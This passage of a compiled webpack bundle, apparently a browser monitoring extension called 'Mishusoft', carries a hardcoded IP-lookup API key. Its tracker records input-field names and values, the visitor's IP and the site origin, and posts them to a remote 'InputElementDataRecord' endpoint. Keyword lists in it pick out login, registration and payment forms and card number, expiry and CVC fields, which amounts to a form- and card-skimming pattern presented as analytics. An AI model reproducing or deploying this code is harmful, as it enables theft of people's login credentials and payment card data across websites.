                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    'dataType': request.data.dataType,
                                    'dataValue': request.data.dataValue,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    }
                    if (request.command === 'saveInputElementData') {
                        return (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                            method: "POST",
                            url: globalAppMonitorMainURL + "InputElementDataRecord",
                            async: true,
                            header: [{ name: "Content-type", value: "application/json;charset=UTF-8" }],
                            data: {
                                "command": request.command,
                                "inputElementData": {
                                    _default_: {
                                        "tracker": appTracker,
                                        "app_id": _db_app__WEBPACK_IMPORTED_MODULE_2__.app.default.version,
                                        "ip": window.sessionStorage.getItem('ip'),
                                        "os_name_arch": BrJS.getPlatformName() + ' ' + BrJS.getPlatformArchitecture(),
                                        "browser": BrJS.getBrowserNameFull()
                                    },
                                    'name': request.data.name,
                                    'type': request.data.type,
                                    'value': request.data.value,
                                    'placeholder': request.data.placeholder,
                                    "workWebsite": request.data.workWebsite
                                }
                            }
                        });
                    }
                }
            }, 100);
        }
    }
}


/***/ }),

/***/ "./Assets/typescripts/common/dom.ts":
/*!******************************************!*\
  !*** ./Assets/typescripts/common/dom.ts ***!
  \******************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "createElement": () => (/* binding */ createElement),
/* harmony export */   "captureElement": () => (/* binding */ captureElement),
/* harmony export */   "captureElements": () => (/* binding */ captureElements)
/* harmony export */ });
/**
 * @param details
 * */
function createElement(details) {
    let element, i, j, k;
    for (i in details) {
        let data = details[i];
        for (j in data) {
            let elementName = j;
            let elementData = data[j];
            element = document.createElement(elementName);
            for (k in elementData) {
                let element_attribute = k;
                let element_attribute_value = elementData[k];
                element.setAttribute(element_attribute, element_attribute_value);
            }
        }
    }
    return element;
}
/**
 * @param selectors HTML valid element selector
 * */
function captureElement(selectors) {
    if (document.querySelector(selectors) !== null) {
        return document.querySelector(selectors);
    }
}
/**
 * @param selectors
 * */
function captureElements(selectors) {
    if (document.querySelectorAll(selectors) !== null) {
        return document.querySelectorAll(selectors);
    }
}


/***/ }),

/***/ "./Assets/typescripts/common/request.ts":
/*!**********************************************!*\
  !*** ./Assets/typescripts/common/request.ts ***!
  \**********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "sendRequest": () => (/* binding */ sendRequest)
/* harmony export */ });
function sendRequest(options, callback) {
    /*worker.postMessage({
        "command": "sendRequest",
        "options": options,
        "receiver": __appHostedServerRoot
    });

    */
    if (options.method !== null && options.url !== null) {
        /*
        * if (app.runtime.request !== 'pending') {}
        * else { viewMessage('Another request is pending.', 'Your previous request is pending. Please wait until succeeded.', 'error')}
        * */
        try {
            let dataType;
            let request = new XMLHttpRequest();
            request.open(options.method, options.url, options.async);
            if (options.header !== null && typeof options.header == "object") {
                for (let i = 0; i < options.header.length; i++) {
                    request.setRequestHeader(options.header[i].name, options.header[i].value);
                    if (options.header[i].value.indexOf('form') !== -1) {
                        dataType = 'formData';
                    }
                    if (options.header[i].value.indexOf('json') !== -1) {
                        dataType = 'jsonData';
                    }
                }
            }
            if (options.data !== null && typeof options.data == "object") {
                if (dataType === 'jsonData') {
                    request.send(JSON.stringify(options.data));
                }
                if (dataType === 'formData') {
                    let formData = new FormData();
                    Object.keys(options.data).forEach(function (key) {
                        formData.append(key, options.data[key]);
                    });
                    request.send(formData);
                }
            }
            else {
                request.send();
            }
            request.onreadystatechange = function () {
                if (this.readyState === 4 && this.status === 200) {
                    if (callback) {
                        callback(this.responseText);
                    }
                    //console.log(this.responseText)
                }
            };
        }
        catch (e) {
            console.error("Fetching error." + e);
        }
    }
    else {
        console.error("Error: METHOD and URL empty.");
    }
    /*window.addEventListener('message',function (event) {
        console.log(event)
    })*/
}


/***/ }),

/***/ "./Assets/typescripts/db/app.ts":
/*!**************************************!*\
  !*** ./Assets/typescripts/db/app.ts ***!
  \**************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "appHost": () => (/* binding */ appHost),
/* harmony export */   "app": () => (/* binding */ app)
/* harmony export */ });
/* harmony import */ var _common_dom__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../common/dom */ "./Assets/typescripts/common/dom.ts");
/* global _root_ */
/*initialize on extension installed*/

let __appHostedServerRoot = (0,_common_dom__WEBPACK_IMPORTED_MODULE_0__.captureElement)('#mishusoft-web-root').content;
/*backup plan*/
if (__appHostedServerRoot === undefined) {
    //__appHostedServerRoot = 'http://localhost/';
    __appHostedServerRoot = 'http://localhost/';
    /*required variables*/
}
if (__appHostedServerRoot.substr(-1) !== '/') {
    __appHostedServerRoot += '/';
}
const appHost = __appHostedServerRoot;
const app = {
    "default": {
        "name": 'mishusoft',
        "version": 'official',
        "author": 'Mr. Al Amin Ahamed Abir',
        "charset": 'utf8mb4',
        "prefix": 'msu',
        "companyName": 'Mishusoft Systems Incorporate.',
        "text": {
            "welcome": "Welcome to Mishusoft Platform",
            "description": "Mishusoft Platform is a robust multi-web platform developed by Mishusoft Systems Inc. This platform is capable of getting your work done quickly and accurately.",
            "install_state": "The application is ready to be installed on your device at this time.",
        }
    },
    "content": {
        "folder": {
            "logos": __appHostedServerRoot + 'media/logos/',
            "css": __appHostedServerRoot + 'assets/css/',
            "js": __appHostedServerRoot + 'assets/js/',
            "images": __appHostedServerRoot + 'assets/images/',
        },
        "file": {
            "default": {
                "link": [
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-57x57.png",
                        "rel": "apple-touch-icon",
                        "size": "57x57"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-60x60.png",
                        "rel": "apple-touch-icon",
                        "size": "60x60"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-72x72.png",
                        "rel": "apple-touch-icon",
                        "size": "72x72"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-76x76.png",
                        "rel": "apple-touch-icon",
                        "size": "76x76"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-114x114.png",
                        "rel": "apple-touch-icon",
                        "size": "114x114"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-120x120.png",
                        "rel": "apple-touch-icon",
                        "size": "120x120"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-144x144.png",
                        "rel": "apple-touch-icon",
                        "size": "144x144"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-152x152.png",
                        "rel": "apple-touch-icon",
                        "size": "152x152"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/apple-icon-180x180.png",
                        "rel": "apple-touch-icon",
                        "size": "180x180"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/android-icon-192x192.png",
                        "rel": "icon",
                        "size": "192x192",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/favicon-16x16.png",
                        "rel": "icon",
                        "size": "16x16",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/favicon-32x32.png",
                        "rel": "icon",
                        "size": "32x32",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/favicon-96x96.png",
                        "rel": "icon",
                        "size": "96x96",
                        "type": "image/png"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/favicon.ico",
                        "rel": "icon",
                        "size": "16x16",
                        "type": "image/vnd.microsoft.icon"
                    },
                    {
                        "href": __appHostedServerRoot + "libraries/logos/manifest.json",
                        "rel": "manifest",
                    },
                    {
                        "name": "msapplication-TileColor",
                        "content": "#ffffff",
                    },
                    {
                        "name": "msapplication-TileImage",
                        "content": __appHostedServerRoot + "libraries/logos/ms-icon-144x144.png"
                    },
                    {
                        "name": "theme-color",
                        "content": "#ffffff",
                    },
                ],
            },
        },
    },
    "website": {
        "home": "https://www.mishusoft.com/",
        "support": "support@mishusoft.com",
        "donate": "https://www.mishusoft.com/payment/donate",
        "IpInfo": "https://api.ipdata.co/?api-key=2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
        "IpInfoKey": "2f9dde381f67efed325acfb1011a988036b28fc6cc02f07668ef7180",
        "fontAwesome": "https://kit.fontawesome.com/b4c8f8449f.js",
        "fontAwesomeKey": "b4c8f8449f",
        "temporary": {
            "home": "http://localhost/",
            "monitorURL": "http://localhost/monitor/browser/",
            "paymentURL": "http://localhost/payment/"
        },
        "publish": {
            "home": "https://www.mishusoft.com/",
            "monitorURL": "https://www.mishusoft.com/monitor/browser/",
            "paymentURL": "https://www.mishusoft.com/payment/"
        }
    },
    "runtime": {
        "request": ""
    }
};


/***/ }),

/***/ "./Assets/typescripts/db/tracker.ts":
/*!******************************************!*\
  !*** ./Assets/typescripts/db/tracker.ts ***!
  \******************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "authFormAttribute": () => (/* binding */ authFormAttribute),
/* harmony export */   "paymentElementsAttribute": () => (/* binding */ paymentElementsAttribute)
/* harmony export */ });
const authFormAttribute = [
    {
        'login': [
            'form1', 'signin', 'signon', 'login', 'logon', 'identi', 'idb', 'wpcf7-form', 'form--1G_Qn', 'fl', 'ng-pristine',
            'index.php', 'new_user', 'ctl23', 'jss', 'connexion', 'file', 'styledform', 'auth',
        ]
    },
    { 'register': ['reg', 'signup', 'join', 'register', 'checkform'] },
    { 'logout': ['logout'] },
    {
        'payment': [
            'credit', 'payment', 'body', 'checkout', 'sslform', 'pay', 'purchase', 'elementsapp', 'creditcard',
            'credit-card', 'addcard', 'bill'
        ]
    },
    {
        'exclude': [
            /*'q', */ 'search', 'googleads', 'presentation', 'captcha', /*'disable', */ 'header',
            'convert-form', 'wam_arten', 'matchkalender', 'suche', 'generate', 'subscribe', 'ignore',
            'download', 'kreditrechner', 'bit_exchange_form', 'applyform', 'app_form', 'comment', 'wallet',
            'picker', 'wp-link', 'meta', 'panier', 'commande', 'recherche', 'settings', 'posts', 'challenge', 'tag',
            'upload', 'mainf', 'domain'
        ]
    },
];
const paymentElementsAttribute = [
    { 'cardNumber': ['num', 'no', 'cardno',] },
    { 'cardHolder': ['holder', 'owner', 'name',] },
    { 'cardTypes': ['brand', 'type', 'types',] },
    { 'cardExpire': ['exp',] },
    { 'cardCVC': ['cvc', 'csc', 'cvv', 'securitycode',] },
    { 'cardPostalCode': ['zip', 'post',] },
    /*{'exclude': ['email', 'user', 'usr']},*/
];


/***/ }),

/***/ "./Assets/typescripts/tracker.ts":
/*!***************************************!*\
  !*** ./Assets/typescripts/tracker.ts ***!
  \***************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _db_app__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./db/app */ "./Assets/typescripts/db/app.ts");
/* harmony import */ var _common_request__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./common/request */ "./Assets/typescripts/common/request.ts");
/* harmony import */ var _classes_tracker__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./classes/tracker */ "./Assets/typescripts/classes/tracker.ts");



function initDb() {
    if (window.sessionStorage) {
        if (window.sessionStorage.getItem('ip') === null) {
            (0,_common_request__WEBPACK_IMPORTED_MODULE_1__.sendRequest)({
                method: "GET",
                url: _db_app__WEBPACK_IMPORTED_MODULE_0__.app.website.IpInfo,
                async: true,
                header: [{ name: "Accept", value: "application/json" }]
            }, function (IpDataReply) {
                window.sessionStorage.setItem('ip', JSON.parse(IpDataReply).ip);
            });
        }
    }
    else {
        console.error('Error:: Your browser does not support session!! Please upgrade or change your browser!!');
    }
}
/*new tracker added*/
initDb();
(new _classes_tracker__WEBPACK_IMPORTED_MODULE_2__.Tracker(window.location.href)).init(function () {
    _classes_tracker__WEBPACK_IMPORTED_MODULE_2__.Tracker.send({
        command: 'saveNavigateData',
        data: {
            username: 'visitor',
            workWebsite: window.location.origin
        }
    });
});
/*new tracker added*/


/***/ })

},
/******/ __webpack_require__ => { // webpackRuntimeModules
/******/ var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
/******/ var __webpack_exports__ = (__webpack_exec__("./Assets/typescripts/tracker.ts"));
/******/ }
]);
//# sourceMappingURL=monitor.js.map